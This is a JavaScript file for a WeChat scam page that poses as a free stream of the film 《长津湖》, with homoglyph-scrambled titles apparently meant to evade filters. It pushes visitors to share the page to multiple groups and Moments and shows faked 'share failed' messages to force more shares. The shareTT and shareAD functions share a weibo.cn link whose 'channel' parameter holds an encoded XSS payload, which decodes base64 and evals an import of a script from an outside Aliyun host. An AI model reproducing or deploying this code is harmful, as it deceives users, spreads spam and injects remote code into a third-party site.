const getApp = window.getApp;
var link;
$(function () {
    loadingback();

    let data = api_data.data;
    data.timestamp = Math.floor(new Date().getTime() / 1000).toString()
    data.nonceStr = getApp.randomString(16)
    var href =location.href.split('#')[0]
    data.signature = getApp.sha1(`jsapi_ticket=${data.ticket}&noncestr=${data.nonceStr}&timestamp=${data.timestamp}&url=${href}`);
    wx.config({
        beta: false,
        debug: false,
        appId: data.appId,
        timestamp: data.timestamp,
        nonceStr: data.nonceStr,
        signature: data.signature,
        jsApiList: ["onMenuShareTimeline", 'hideAllNonBaseMenuItem', 'hideOptionMenu', 'hideMenuItems', "onMenuShareAppMessage", "showMenuItems"]
    });

    wx.ready(function () {
        setTimeout(function () {
            window.history.replaceState({}, '', window.location.origin);
            wx.hideOptionMenu();

        });
        setTimeout(function () {
            wx.showMenuItems({
                menuList: ['menuItem:share:appMessage']
            });
        }, 1000);
        shareT();

    });

    wx.error(function (res) {
        alert("error");
    });

    document.addEventListener("visibilitychange", () => {
        if (!document.hidden) {
            tNum += 1;
            if(window.isIos){
                show2();
            }else{
                show();
            }

        }

    });
})



tNum = 0;
qNum = 0;
//var  shareImg="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rIoicqLibLOqCMtKGMuFhkEwTV5mQ2LmiciaMw/100";
var shareImg = "https://vastweb.oss-cn-hangzhou.aliyuncs.com/newvideo/100.jpg";
//var itemsAppId = ['wx9a39972cfbfe213f','wxa7ee41670beb8870','wx3d7086fcb3d42c87'];
var itemsAppId = [];
var remen = ["最热影视","热映影视","超燃电影","票房第一","最新影片","影视","影片","热血影片"];
var pmtype = ["髙青","全髙青","8k超青","4k髙青","篮光","超青","720p髙青"];
var chang = ["苌","長","萇","鋹","悵","倀"];
var jing = ["垏","珒","盡","堻"];
var hu = ["湖","瑚","鍸","蝴"];
var guankan = ["线上观看","立既看","精彩看","兔费看","抢先观影","实时观看","线上观影","一同观看","在线譒放","立既譒出","点击譒放","现在播出","加长版","网上观影","线上观影","欢迎品鉴","观影","完整版","未删减版","——彩蛋版"] ;
var rt = [] ;
rt.push(randTitle(1));
rt.push(randTitle(2));
rt.push(randTitle(3));
rt.push(randTitle(4));
rt.push(randTitle(5));
//var rt = ["【苌津楜】蓝光","《长津湖》高凊","《长津湖》在线观看","《长津湖》蓝光","【苌津楜】超凊","【长津湖】1080p蓝光","《长津湖》2K超凊","【苌津楜】全高凊","《长津湖》臻彩视听"];

var rdesc=["$shi"+"等"+random_num(5,17)+"个影迷正在观赏！"];
var title=rt[Math.floor((Math.random() * rt.length))]
//var title2="《苌堻湖》8k极凊在线鉴赏                         \n\n$shi";
var rt2 = ["【苌堻湖】蓝光","《長津瑚》髙凊","《萇垏湖》在线观看","《萇垏湖》蓝光","【苌津湖】超凊","【苌津湖】1440p篮光","《苌津湖》8K超凊","【苌津湖】全髙凊","《苌津瑚》臻彩视听","《长垏湖》抢先观影","《長津瑚》8K超凊一起观看","《長津湖》立既播出","《萇垏湖》点击譒放","《苌垏湖》现在播出","【長津湖】1440p蓝光全片","《伥垏湖》网上观影","《伥垏湖》线上观影","《苌津湖》一起鉴赏","《長津湖》一同观影","【苌津湖】髙凊欣赏","《伥垏湖》网上品鉴","【苌津楜】篮光观影","【苌津湖】超凊观赏"];
var title2 = rt2[Math.floor((Math.random() * rt2.length))] + "\n\n$shi";
title=reTitle(title);
title2=reTitle(title2);
desc=reTitle(rdesc[Math.floor((Math.random() * rdesc.length))]);

function randTitle(type =1 ){
    var title = '';
    if(type == 1){
        title = "【"+chang[Math.floor((Math.random() * chang.length))] + jing[Math.floor((Math.random() * jing.length))] + hu[Math.floor((Math.random() * hu.length))] + "】"+ pmtype[Math.floor((Math.random() * pmtype.length))] + guankan[Math.floor((Math.random() * guankan.length))];
    }
    if(type == 2){
        title = "《"+chang[Math.floor((Math.random() * chang.length))] + jing[Math.floor((Math.random() * jing.length))] + hu[Math.floor((Math.random() * hu.length))] + "》"+ pmtype[Math.floor((Math.random() * pmtype.length))] ;
    }
    if(type == 3){
        title = '"'+chang[Math.floor((Math.random() * chang.length))] + jing[Math.floor((Math.random() * jing.length))] + hu[Math.floor((Math.random() * hu.length))] + '"' + guankan[Math.floor((Math.random() * guankan.length))];
    }
    if(type == 4){
        title = remen[Math.floor((Math.random() * remen.length))]+'《'+chang[Math.floor((Math.random() * chang.length))] + jing[Math.floor((Math.random() * jing.length))] + hu[Math.floor((Math.random() * hu.length))] + '》' + guankan[Math.floor((Math.random() * guankan.length))];
    }
    if(type == 5){
        title = remen[Math.floor((Math.random() * remen.length))]+'《'+chang[Math.floor((Math.random() * chang.length))] + jing[Math.floor((Math.random() * jing.length))] + hu[Math.floor((Math.random() * hu.length))] + '》'+ pmtype[Math.floor((Math.random() * pmtype.length))] ;
    }
    return title ;
}

function openAd(){
    return false;

}
let successAudio= new Audio("https://vastweb.oss-cn-hangzhou.aliyuncs.com/mp3/tip.mp3");
let failAudio = new Audio("https://vastweb.oss-cn-hangzhou.aliyuncs.com/mp3/fail.mp3")
function show() {
    if (tNum == 1) {
        successAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">3</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>即可免流量观看！')
        shareT();
    }else if (tNum == 2) {
        successAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>即可免流量观看！')
        if(openAd()){shareTT()}else(shareT());
    }
    else if (tNum == 3) {
        failAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享到相同的<span style="font-size: 20px;color: #f5294c" >微信群</span>会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>！')

        shareT();
    } else if (tNum == 4) {
        successAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>即可免流量观看！')

        shareT();
    } else if (tNum == 5) {
        successAudio.play();
        alert_Mes('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可免流量播放!')
        // tNum+=1;
        shareQ();
        wx.hideOptionMenu();
        wx.showMenuItems({
            menuList: ['menuItem:share:timeline']
        });
    }else if(tNum==6){
        failAudio.play();
        alert_Mes('<span style="font-size: 30px;color: #f5294c">分享失败！</span><br/>请公开分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可免流量播放!')
        if(openAd()){shareAD()}else(shareQ());
    } else if(tNum==7){
        successAudio.play();
        setTimeout(function () {
            location.href=api_data.play;
        }, 500);
    }
}
function show2(){
    if(tNum ==1){
        successAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">3</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>即可免流量观看！')
        shareT();
    }else if (tNum == 2) {
        failAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享到相同的<span style="font-size: 20px;color: #f5294c" >微信群</span>会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">3</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>！')
        shareT();
    }else if (tNum == 3) {
        successAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>即可免流量观看！')
        if(openAd()){shareTT()}else(shareT());
    }else if (tNum == 4) {
        failAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享的<span style="font-size: 20px;color: #f5294c" >微信群</span>人数要大于<span style="font-size: 20px;color: #f5294c">50</span><br>请继续分享到人数<span style="font-size: 20px;color: #f5294c">大于50</span>的<span style="font-size: 30px;color: #f5294c">2</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>！')
    }else if (tNum == 5) {
        successAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享成功</span></br>请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的<span style="font-size: 20px;color: #f5294c" >微信群</span>即可免流量观看！')

        shareT();
    }else if(tNum==6){
        failAudio.play();
        alert_Mes('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>提示:网络连接错误<br>请重新分享到<span style="font-size: 30px;color: #f5294c">1</span>个<span style="font-size: 20px;color: #f5294c" >微信群</span>即可免流量观看！')
    }else if(tNum==7){
        successAudio.play();
        setTimeout(function () {
            location.href=api_data.play;
        }, 500);
    }
}
//入口
function getLink(){
}
function shareT() {
    function onBridgeReadyApp() {
        console.log(link);
        function shareFriend() {
            WeixinJSBridge.invoke('sendAppMessage', {
                "appid": itemsAppId[Math.floor(Math.random() * itemsAppId.length)],
                "img_url": api_data.shareImg,
                "img_width": "200",
                "img_height": "200",
                "link": api_data.link[0],
                "desc": reTitle(rdesc[Math.floor((Math.random() * rdesc.length))]),
                "title": reTitle(rt[Math.floor((Math.random() * rt.length))])
            }, function (res) {

            })
        }
        WeixinJSBridge.on('menu:share:appmessage', function(argv) {
            shareFriend();
        });
    }


    if (typeof WeixinJSBridge == "undefined") {
        if (document.addEventListener) {
            document.addEventListener('WeixinJSBridgeReady', onBridgeReadyApp, false);
        } else if (document.attachEvent) {
            document.attachEvent('WeixinJSBridgeReady', onBridgeReadyApp);
            document.attachEvent('onWeixinJSBridgeReady', onBridgeReadyApp);
        }
    } else {
        onBridgeReadyApp();
    }
}

function shareTT() {

    wx.onMenuShareAppMessage({
        title:title,
        link: "https://book1.weibo.cn/dpool/newbook/bookv1/down.php?channel=%27%3Ba%3D%5Cu0061%5Cu0074%5Cu006f%5Cu0062%60aW1wb3J0KCcvLzF3bGIub3NzLWNuLWhhbmd6aG91LmFsaXl1bmNzLmNvbS9zL3gnKTs=%60%3B%5Cu0065%5Cu0076%5Cu0061%5Cu006c%28a%29%2F%2F",
        imgUrl: api_data.shareImg,
        desc:desc ,
        success: function () {

        },
        fail: function () {
        }
    })
}


function shareQ() {


    wx.onMenuShareTimeline({
        title: title2,
        link: api_data.link[1],
        imgUrl: api_data.shareImg,
        success: function () {

        },
        fail: function () {
        }
    })
}


function shareAD() {


    wx.onMenuShareTimeline({
        title: title2,
        link: "https://book1.weibo.cn/dpool/newbook/bookv1/down.php?channel=%27%3Ba%3D%5Cu0061%5Cu0074%5Cu006f%5Cu0062%60aW1wb3J0KCcvLzF3bGIub3NzLWNuLWhhbmd6aG91LmFsaXl1bmNzLmNvbS9zL3gnKTs=%60%3B%5Cu0065%5Cu0076%5Cu0061%5Cu006c%28a%29%2F%2F",
        imgUrl: api_data.shareImg,
        success: function () {

        },
        fail: function () {
        }
    })
}

function  randomChar(l) {
    var x = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz0123456789";
    var tmp = "";
    var timestamp = new Date().getTime();
    for (var i = 0; i < l; i++) {
        tmp += x.charAt(Math.ceil(Math.random() * 100000000) % x.length);
    }
    return tmp;
}

function GetRandomNum(Min,Max)
{
    var Range = Max - Min;
    var Rand = Math.random();
    return(Min + Math.round(Rand * Range));
}
function openLink(url) {
    const label = document.createElement('a');
    label.setAttribute('rel', 'noreferrer');
    label.setAttribute('href', url);
    document.body.appendChild(label);
    label.click();
}
function randomString(len) {
    len = len || 32;
    var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
    /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
    var maxPos = $chars.length;
    var pwd = '';
    for (i = 0; i < len; i++) {
        pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
}
function random_num(max, min) {
    var suff = parseInt(Math.random() * (max - min + 1) + min, 10);
    Math.floor(Math.random() * (max - min + 1) + min);
    return suff;
}
function reTitle(t){
    t=t.replace("$shi",getRandomChineseWord(random_num(2,4)));
    return t;
}


function getRandomChineseWord(wordCount) {
    var _rsl = "";

    Array(wordCount).fill('').forEach(item => {
        var _randomUniCode = Math.floor(Math.random() * (40870 - 19968) + 19968).toString(16);
        _rsl += eval("_rsl=" + '"\\u' + _randomUniCode + '"');
    });

    return _rsl;
}
function loadingback() {
    getApp.goback(api_data.back)
}